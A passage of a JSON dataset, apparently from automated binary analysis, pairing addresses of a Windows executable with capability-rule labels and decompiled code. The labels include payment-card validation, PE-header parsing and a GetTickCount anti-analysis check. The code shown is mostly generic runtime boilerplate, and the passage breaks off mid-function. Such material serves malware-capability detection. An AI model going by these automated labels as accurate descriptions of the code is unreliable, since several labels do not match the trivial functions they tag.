        "decompiled_code": "\nvoid __cdecl fcn.00406ce0(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    uVar1 = fcn.004067e7();\n    if (arg_8h == 0) {\n        arg_8h = 0x42cb48;\n    }\n    else {\n        iVar2 = arg_8h;\n        uVar3 = fcn.005074eb(uVar1);\n        if (0x103 < uVar3) {\n            fcn.0043bca7(uVar3, 0xa0);\n            fcn.00410f95(iVar2);\n            return;\n        }\n    }\n    iVar2 = fcn.00405ac3(0x140);\n    *(in_ECX + 8) = iVar2;\n    fcn.0040690f(iVar2 + 0x2c, 0x104, arg_8h);\n    fcn.00592969(arg_8h, *(in_ECX + 8));\n    return;\n}\n",
        "token_count": 254
    },
    "004070bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004070bd(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00412e7b(arg_8h, arg_ch, 0x10);\n    return iVar1 == 0;\n}\n",
        "token_count": 63
    },
    "004074ba": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004074ba(uint arg_8h, uchar *arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    ushort *puVar3;\n    \n    if ((arg_ch != NULL) && (arg_10h != 0)) {\n        iVar2 = fcn.00407ce3();\n        puVar3 = fcn.00405bf2(*(iVar2 + 0xc), arg_8h);\n        if (puVar3 == NULL) {\n            *arg_ch = 0;\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = fcn.00598259(*puVar3, 0, 0, puVar3 + 1, *puVar3, arg_ch, arg_10h + -1, 0, 0);\n            arg_ch[iVar2] = 0;\n        }\n        return iVar2;\n    }\n    fcn.00405f96();\n    pcVar1 = swi(3);\n    iVar2 = (*pcVar1)();\n    return iVar2;\n}\n",
        "token_count": 243
    },
    "00407855": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00407855(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    fcn.00405e4a(\"comctl32.dll\");\n    *(unaff_EBP + -4) = 0;\n    fcn.004077e7(unaff_EBP + -0x10);\n    fcn.00401020();\n    *extraout_ECX = vtable.CComCtlWrapper.0;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    extraout_ECX[8] = NULL;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[10] = NULL;\n    extraout_ECX[0xb] = NULL;\n    extraout_ECX[0xc] = NULL;\n    extraout_ECX[0xd] = NULL;\n    extraout_ECX[0xe] = NULL;\n    extraout_ECX[0xf] = NULL;\n    extraout_ECX[0x10] = NULL;\n    extraout_ECX[0x11] = NULL;\n    extraout_ECX[0x12] = NULL;\n    extraout_ECX[0x13] = NULL;\n    extraout_ECX[0x14] = NULL;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x16] = NULL;\n    extraout_ECX[0x17] = NULL;\n    extraout_ECX[0x18] = NULL;\n    extraout_ECX[0x19] = NULL;\n    extraout_ECX[0x1a] = NULL;\n    extraout_ECX[0x1b] = NULL;\n    extraout_ECX[0x1c] = NULL;\n    extraout_ECX[0x1d] = NULL;\n    extraout_ECX[0x1e] = NULL;\n    extraout_ECX[0x1f] = NULL;\n    extraout_ECX[0x20] = NULL;\n    extraout_ECX[0x21] = NULL;\n    extraout_ECX[0x22] = NULL;\n    extraout_ECX[0x23] = NULL;\n    extraout_ECX[0x24] = NULL;\n    extraout_ECX[0x25] = NULL;\n    extraout_ECX[0x26] = NULL;\n    extraout_ECX[0x27] = NULL;\n    extraout_ECX[0x28] = NULL;\n    extraout_ECX[0x29] = NULL;\n    extraout_ECX[0x2a] = NULL;\n    extraout_ECX[0x2b] = NULL;\n    extraout_ECX[0x2c] = NULL;\n    extraout_ECX[0x2d] = NULL;\n    extraout_ECX[0x2e] = NULL;\n    extraout_ECX[0x2f] = NULL;\n    extraout_ECX[0x30] = NULL;\n    extraout_ECX[0x31] = NULL;\n    extraout_ECX[0x32] = NULL;\n    extraout_ECX[0x33] = NULL;\n    extraout_ECX[0x34] = NULL;\n    extraout_ECX[0x35] = NULL;\n    extraout_ECX[0x36] = NULL;\n    extraout_ECX[0x37] = NULL;\n    extraout_ECX[0x38] = NULL;\n    extraout_ECX[0x39] = NULL;\n    extraout_ECX[0x3a] = NULL;\n    extraout_ECX[0x3b] = NULL;\n    extraout_ECX[0x3c] = NULL;\n    extraout_ECX[0x3d] = NULL;\n    extraout_ECX[0x3e] = NULL;\n    extraout_ECX[0x3f] = NULL;\n    extraout_ECX[0x40] = NULL;\n    extraout_ECX[0x41] = NULL;\n    extraout_ECX[0x42] = NULL;\n    extraout_ECX[0x43] = NULL;\n    extraout_ECX[0x44] = NULL;\n    extraout_ECX[0x45] = NULL;\n    extraout_ECX[0x46] = NULL;\n    extraout_ECX[0x47] = NULL;\n    extraout_ECX[0x48] = NULL;\n    extraout_ECX[0x49] = NULL;\n    extraout_ECX[0x4a] = NULL;\n    extraout_ECX[0x4b] = NULL;\n    extraout_ECX[0x4c] = NULL;\n    extraout_ECX[0x4d] = NULL;\n    extraout_ECX[0x4e] = NULL;\n    extraout_ECX[0x4f] = NULL;\n    extraout_ECX[0x50] = NULL;\n    extraout_ECX[0x51] = NULL;\n    extraout_ECX[0x52] = NULL;\n    extraout_ECX[0x53] = NULL;\n    extraout_ECX[0x54] = NULL;\n    extraout_ECX[0x55] = NULL;\n    extraout_ECX[0x56] = NULL;\n    extraout_ECX[0x57] = NULL;\n    extraout_ECX[0x58] = NULL;\n    extraout_ECX[0x59] = NULL;\n    extraout_ECX[0x5a] = NULL;\n    extraout_ECX[0x5b] = NULL;\n    extraout_ECX[0x5c] = NULL;\n    extraout_ECX[0x5d] = NULL;\n    extraout_ECX[0x5e] = NULL;\n    extraout_ECX[0x5f] = NULL;\n    extraout_ECX[0x60] = NULL;\n    extraout_ECX[0x61] = NULL;\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 1386
    },
    "00407a79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00407a79(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    fcn.00405e4a(\"comdlg32.dll\");\n    *(unaff_EBP + -4) = 0;\n    fcn.004077e7(unaff_EBP + -0x10);\n    fcn.00401020();\n    *extraout_ECX = vtable.CCommDlgWrapper.0;\n    extraout_ECX[4] = NULL;\n    extraout_ECX[5] = NULL;\n    extraout_ECX[6] = NULL;\n    extraout_ECX[7] = NULL;\n    extraout_ECX[8] = NULL;\n    extraout_ECX[9] = NULL;\n    extraout_ECX[10] = NULL;\n    extraout_ECX[0xb] = NULL;\n    extraout_ECX[0xc] = NULL;\n    extraout_ECX[0xd] = NULL;\n    extraout_ECX[0xe] = NULL;\n    extraout_ECX[0xf] = NULL;\n    extraout_ECX[0x10] = NULL;\n    extraout_ECX[0x11] = NULL;\n    extraout_ECX[0x12] = NULL;\n    extraout_ECX[0x13] = NULL;\n    extraout_ECX[0x14] = NULL;\n    extraout_ECX[0x15] = NULL;\n    extraout_ECX[0x16] = NULL;\n    extraout_ECX[0x17] = NULL;\n    extraout_ECX[0x18] = NULL;\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 408
    },
    "00407afc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00407afc(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    fcn.00405e4a(\"shell32.dll\");\n    *(unaff_EBP + -4) = 0;\n    fcn.004077e7(unaff_EBP + -0x10);\n    fcn.00401020();\n    *extraout_ECX = vtable.CShellWrapper.0;\n    extraout_ECX[4] = NULL;\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 162
    },
    "00407d16": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00407d16(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uStack8;\n    \n    fcn.00407ce3();\n    iVar2 = fcn.004077d3();\n    if (iVar2 == 0) {\n        uStack8 = 0x435390;\n        fcn.004111ef(&uStack8, 0x431f08);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "00408057": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408057(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407ce3();\n    if (*(iVar1 + 4) != NULL) {\n    // WARNING: Could not recover jumptable at 0x0040806d. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(**(iVar1 + 4) + 0x98))();\n        return;\n    }\n    fcn.00407ef6(0, arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 144
    },
    "00408657": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408657(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t unaff_EDI;\n    \n    iVar2 = arg_8h;\n    iVar4 = unaff_EDI;\n    if (-1 < arg_8h) goto code_r0x0040866c;\n    do {\n        fcn.00405f96();\n        iVar4 = unaff_EDI;\ncode_r0x0040866c:\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar2 == 0) {\n            if (*(in_ECX + 4) != 0) {\n                fcn.00405af2(*(in_ECX + 4));\n                *(in_ECX + 4) = 0;\n            }\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            return;\n        }\n        if (*(in_ECX + 4) == 0) {\n            iVar4 = *(in_ECX + 0x10);\n            if (*(in_ECX + 0x10) < iVar2) {\n                iVar4 = iVar2;\n            }\n            uVar3 = fcn.00405ac3(iVar4 << 2);\n            *(in_ECX + 4) = uVar3;\n            fcn.00410fb0(uVar3, 0, iVar4 << 2);\n            *(in_ECX + 0xc) = iVar4;\n            goto code_r0x00408788;\n        }\n        unaff_EDI = *(in_ECX + 0xc);\n        if (iVar2 <= unaff_EDI) {\n            iVar1 = *(in_ECX + 8);\n            if (iVar1 < iVar2) {\n                fcn.00410fb0(*(in_ECX + 4) + iVar1 * 4, 0, (iVar2 - iVar1) * 4, iVar4);\n            }\n            goto code_r0x00408788;\n        }\n        iVar4 = *(in_ECX + 0x10);\n        if (iVar4 == 0) {\n            iVar4 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar4 < 4) {\n                iVar4 = 4;\n            }\n            else if (0x400 < iVar4) {\n                iVar4 = 0x400;\n            }\n        }\n        arg_8h = iVar4 + unaff_EDI;\n        if (iVar4 + unaff_EDI <= iVar2) {\n            arg_8h = iVar2;\n        }\n    } while (arg_8h < unaff_EDI);\n    iVar4 = fcn.00405ac3(arg_8h << 2);\n    fcn.00405b53(iVar4, arg_8h << 2, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00410fb0(iVar4 + *(in_ECX + 8) * 4, 0, (iVar2 - *(in_ECX + 8)) * 4);\n    fcn.00405af2(*(in_ECX + 4));\n    *(in_ECX + 4) = iVar4;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x00408788:\n    *(in_ECX + 8) = iVar2;\n    return;\n}\n",
        "token_count": 820
    },
    "00408792": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408792(int32_t arg_8h, uint *arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar2 = *(in_ECX + 8);\n            fcn.00408657(iVar2 + arg_10h, 0xffffffff);\n            iVar2 = (iVar2 - arg_8h) * 4;\n            fcn.00406056(*(in_ECX + 4) + (arg_8h + arg_10h) * 4, iVar2, *(in_ECX + 4) + arg_8h * 4, iVar2);\n            fcn.00410fb0(*(in_ECX + 4) + arg_8h * 4, 0, arg_10h << 2);\n        }\n        else {\n            fcn.00408657(arg_8h + arg_10h, 0xffffffff);\n        }\n        arg_8h = arg_8h << 2;\n        do {\n            arg_10h = arg_10h + -1;\n            *(arg_8h + *(in_ECX + 4)) = *arg_ch;\n            arg_8h = arg_8h + 4;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.00405f96();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 371
    },
    "00409a0b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409a0b(uint32_t arg_8h)\n\n{\n    if (0x10 < arg_8h) {\n        fcn.00405f96();\n    }\n    fcn.00598176();\n    return;\n}\n",
        "token_count": 57
    },
    "00409ad9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409ad9(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uchar var_104h;\n    uint var_103h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435b90 ^ &stack0xfffffffc;\n    if (arg_8h != 0) goto code_r0x00409b00;\n    do {\n        fcn.00405f96();\ncode_r0x00409b00:\n    } while (arg_ch == 0);\n    uVar1 = func_0x0049f5e2(arg_ch, arg_ch);\n    var_104h = 0;\n    fcn.00410fb0(&var_103h, 0, 0xff);\n    if (uVar1 < 0x101) {\n        func_0x0075c349(arg_8h, &var_104h, 0x100);\n        return;\n    }\n    func_0x0049dd2c(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 245
    },
    "00409f44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00409f44(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    puVar2 = fcn.00409d42(arg_8h, &arg_8h, &var_4h);\n    if (puVar2 == NULL) {\n        if (*(in_ECX + 4) == 0) {\n            fcn.00409c99(*(in_ECX + 8), 1);\n        }\n        puVar2 = fcn.00409ef4();\n        puVar2[1] = iVar1;\n        *puVar2 = *(arg_8h * 4 + *(in_ECX + 4));\n        *(arg_8h * 4 + *(in_ECX + 4)) = puVar2;\n    }\n    return puVar2 + 2;\n}\n",
        "token_count": 217
    },
    "0040a0b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a0b9(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    \n    iVar1 = arg_8h;\n    iVar4 = 0;\n    if (-1 < arg_8h) goto code_r0x0040a0d1;\n    do {\n        fcn.00405f96();\ncode_r0x0040a0d1:\n        if (iVar4 <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar1 == iVar4) {\n            fcn.00405af2(*(in_ECX + 4));\n            *(in_ECX + 0xc) = iVar4;\n            *(in_ECX + 8) = iVar4;\n            goto code_r0x0040a1d5;\n        }\n        if (*(in_ECX + 4) == iVar4) {\n            uVar2 = fcn.00405ac3(iVar1 << 2);\n            *(in_ECX + 4) = uVar2;\n            fcn.00410fb0(uVar2, 0, iVar1 << 2);\n            *(in_ECX + 0xc) = iVar1;\ncode_r0x0040a13d:\n            *(in_ECX + 8) = iVar1;\n            return;\n        }\n        iVar4 = *(in_ECX + 0xc);\n        if (iVar1 <= iVar4) {\n            iVar4 = *(in_ECX + 8);\n            if (iVar4 < iVar1) {\n                fcn.00410fb0(*(in_ECX + 4) + iVar4 * 4, 0, (iVar1 - iVar4) * 4);\n            }\n            goto code_r0x0040a13d;\n        }\n        iVar3 = *(in_ECX + 0x10);\n        if (iVar3 == 0) {\n            iVar3 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar3 < 4) {\ncode_r0x0040a16f:\n                iVar3 = 4;\n            }\n            else if (iVar3 < 0x401) {\n                if (iVar3 < 4) goto code_r0x0040a16f;\n            }\n            else {\n                iVar3 = 0x400;\n            }\n        }\n        arg_8h = iVar3 + iVar4;\n        if (iVar3 + iVar4 <= iVar1) {\n            arg_8h = iVar1;\n        }\n    } while (arg_8h < iVar4);\n    iVar4 = fcn.00405ac3(arg_8h << 2);\n    fcn.00405b53(iVar4, arg_8h << 2, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00410fb0(iVar4 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.00405af2(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0040a1d5:\n    *(in_ECX + 4) = iVar4;\n    return;\n}\n",
        "token_count": 792
    },
    "0040a1df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a1df(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.0040a0b9(iVar1 + arg_10h, 0xffffffff);\n            fcn.00406056(*(in_ECX + 4) + (arg_8h + arg_10h) * 4, ((*(in_ECX + 8) - arg_8h) - arg_10h) * 4, \n                         *(in_ECX + 4) + arg_8h * 4, (iVar1 - arg_8h) * 4);\n            fcn.00410fb0(*(in_ECX + 4) + arg_8h * 4, 0, arg_10h << 2);\n        }\n        else {\n            fcn.0040a0b9(arg_8h + arg_10h, 0xffffffff);\n        }\n        arg_8h = arg_8h << 2;\n        do {\n            arg_10h = arg_10h + -1;\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 4;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.00405f96();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 394
    },
    "0040a3ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040a3ea(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    fcn.00403540();\n    *(unaff_EBP + -4) = 0;\n    iVar1 = fcn.00405dd3(*(unaff_EBP + 0xc));\n    if (iVar1 != 0) {\n        fcn.0040a2a6(*(unaff_EBP + 8), *(unaff_EBP + -0x10), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    }\n    fcn.00401020();\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 236
    },
    "0040a88f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0040a88f(int32_t arg_8h, uint *arg_ch, uint noname_2, code *arg_14h, uint *arg_18h, int32_t arg_1ch, \n            int32_t *arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t extraout_ECX;\n    uint unaff_EBX;\n    uint uVar3;\n    uint *unaff_ESI;\n    uint *puVar4;\n    \n    uVar3 = unaff_EBX;\n    puVar4 = unaff_ESI;\n    if (arg_8h != 0) goto code_r0x0040a8a0;\ncode_r0x0040a89b:\n    fcn.00405f96();\n    arg_8h = extraout_ECX;\n    uVar3 = unaff_EBX;\n    puVar4 = unaff_ESI;\ncode_r0x0040a8a0:\n    unaff_EBX = 1;\n    if (arg_20h != NULL) {\n        *arg_20h = arg_8h;\n        arg_20h[1] = arg_14h;\n        return 1;\n    }\n    if (0xb < arg_1ch - 0x39U) {\n        return 0;\n    }\n    // switch table (12 cases) at 0x40a997\n    unaff_ESI = puVar4;\n    switch(*((arg_1ch - 0x39U) * 4 + 0x40a997)) {\n    case 0x40a8d1:\n        (*arg_14h)();\n        return 1;\n    case 0x40a8d9:\n        uVar2 = (*arg_14h)();\n        return uVar2;\n    case 0x40a8e1:\n        arg_18h = arg_ch;\n        break;\n    case 0x40a8ec:\n        arg_18h = arg_ch;\n        goto code_r0x0040a985;\n    case 0x40a8f4:\n        if (arg_18h != NULL) {\n            (*arg_14h)(arg_18h[1], *arg_18h);\n            return 1;\n        }\n        goto code_r0x0040a89b;\n    case 0x40a908:\n        if (arg_18h != NULL) {\n            uVar2 = (*arg_14h)(arg_18h[1], *arg_18h);\n            return uVar2;\n        }\n        goto code_r0x0040a89b;\n    case 0x40a919:\n        if (arg_18h != NULL) {\n            (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n            return 1;\n        }\n        goto code_r0x0040a89b;\n    case 0x40a931:\n        if (arg_18h != NULL) {\n            uVar2 = (*arg_14h)(arg_ch, arg_18h[1], *arg_18h);\n            return uVar2;\n        }\n        goto code_r0x0040a89b;\n    case 0x40a949:\n        unaff_ESI = arg_18h;\n        if (arg_18h != NULL) {\n            (*arg_14h)(arg_18h);\n            goto code_r0x0040a958;\n        }\n        goto code_r0x0040a89b;\n    case 0x40a966:\n        goto code_r0x0040a966;\n    case 0x40a97a:\n        break;\n    case 0x40a982:\ncode_r0x0040a985:\n        uVar2 = (*arg_14h)(arg_18h);\n        return uVar2;\n    }\n    (*arg_14h)(arg_18h);\n    return 1;\ncode_r0x0040a966:\n    unaff_ESI = arg_18h;\n    if (arg_18h != NULL) {\n        (*arg_14h)(arg_18h, arg_ch, puVar4, uVar3);\ncode_r0x0040a958:\n        iVar1 = arg_18h[7];\n        arg_18h[7] = 0;\n        return iVar1 == 0;\n    }\n    goto code_r0x0040a89b;\n}\n",
        "token_count": 982
    },
    "0040b0fd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040b0fd(void)\n\n{\n    uint var_98h;\n    uint var_94h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435b90 ^ &stack0xfffffffc;\n    fcn.00410fb0(&var_94h, 0, 0x90);\n    var_98h = 0x94;\n    fcn.006a9a8c(&var_98h);\n    return;\n}\n",
        "token_count": 109
    },
    "0040c2d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c2d1(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    \n    puVar1 = fcn.00409f44(arg_8h);\n    *puVar1 = arg_ch;\n    return;\n}\n",
        "token_count": 62
    },
    "0040d48f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040d48f(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = fcn.0040d3ef(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = iVar1 + 0x1c;\n    if (iVar1 == 0) {\n        fcn.00405f96(uVar3);\n        iVar1 = extraout_ECX;\n    }\n    if (*(iVar1 + 4) != 0) {\n        for (puVar2 = *(*(iVar1 + 4) + ((unaff_retaddr >> 4) % *(iVar1 + 8)) * 4); puVar2 != NULL; puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 241
    },
    "0040e8ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e8ea(code **param_1)\n\n{\n    int32_t iVar1;\n    \n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    param_1[5] = 0xc0000001;\n    fcn.0040e7e8();\n    iVar1 = fcn.00407ce3();\n    fcn.00725c72(iVar1 + 0x2c);\n    return;\n}\n",
        "token_count": 167
    },
    "00410762": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00410762(void)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.00407ce3();\n    fcn.006c2b31(uVar1 >> 0x20, uVar1 + 0x2c);\n    return;\n}\n",
        "token_count": 63
    },
    "0041093c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041093c(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    uint *puVar2;\n    uint32_t unaff_retaddr;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = fcn.004108b4(0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = iVar1 + 0x1c;\n    if (iVar1 == 0) {\n        fcn.00405f96(uVar3);\n        iVar1 = extraout_ECX;\n    }\n    if (*(iVar1 + 4) != 0) {\n        for (puVar2 = *(*(iVar1 + 4) + ((unaff_retaddr >> 4) % *(iVar1 + 8)) * 4); puVar2 != NULL; puVar2 = *puVar2) {\n            if (puVar2[1] == unaff_retaddr) {\n                return puVar2[2];\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 239
    },
    "00410c86": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410c86(uint arg_8h)\n\n{\n    code **in_ECX;\n    \n    fcn.00410bb3(&arg_8h);\n    *in_ECX = vtable.std::bad_cast.0;\n    return;\n}\n",
        "token_count": 59
    },
    "00411292": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411292(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0041123b(fcn.00418ce1, arg_8h, 0, arg_ch);\n    return;\n}\n",
        "token_count": 52
    },
    "00412e7b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.00412e7b(int32_t *arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if (arg_10h == 0) {\n        return 0;\n    }\n    if (arg_10h == 1) {\n        uVar1 = *arg_8h;\n        uVar2 = *arg_ch;\n    }\n    else if (arg_10h == 2) {\n        uVar1 = *arg_8h;\n        uVar2 = *arg_ch;\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 1);\n        uVar2 = *(arg_ch + 1);\n    }\n    else if (arg_10h == 3) {\n        uVar1 = *arg_8h;\n        uVar2 = *arg_ch;\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 1);\n        uVar2 = *(arg_ch + 1);\n        if ((uVar1 != uVar2) && 